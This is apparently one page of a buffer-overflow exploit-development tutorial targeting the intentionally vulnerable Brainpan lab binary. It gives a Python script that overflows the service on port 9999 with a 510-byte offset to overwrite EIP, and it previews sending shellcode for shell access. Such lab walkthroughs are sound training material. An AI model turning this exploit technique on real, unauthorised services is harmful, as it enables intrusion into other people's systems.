# Overwriting the EIP

 We need to overwrite the ``EIP``. It means that there are ``510`` bytes right before we get to the ``EIP``. To overwrite the ``EIP``, we need 510 bytes to get to ``EIP`` plus 4 bytes because the ``EIP`` size is 4 bytes.

 I created another script called [brainpan_fuzzer3.py](https://github.com/cris-m/buffer_overflow_exploit_development/blob/main/assets/resources/brainpan_fuzzer3.py) to overwrite the ``EIP``.  Our script will send 510 bytes of ``A`` to reach the ``EIP`` and 4 bytes of ``B`` to overwrite the ``EIP``.

 ```python
 #!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = b"A" * 510 + b"B" * 4

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.10.4', 9999))
        payload = b'shitstorm /.:/' + buffer
        sock.send(payload)
        sock.close()
    except:
        print("Error connecting to the server")
        sys.exit()
 ```

 After executing the script, I went to check ``Immunity Debugger`` to examine the debuggerâ€™s output, I saw that ``EBP`` is filled out with all ``A``'s (41414141) and the ``EIP`` with all ``B``'s (42424242).

 ![alt Overwrite EIP](../images/brainpan15.png  "Overwrite EIP")

Now we can send a malicious shell code to infect our target computer and gain shell access via ``brainpan.exe`` buffer.

___

Next to [Finding bad characters](https://github.com/cris-m/buffer_overflow_exploit_development/blob/main/assets/documentations/characters.md)
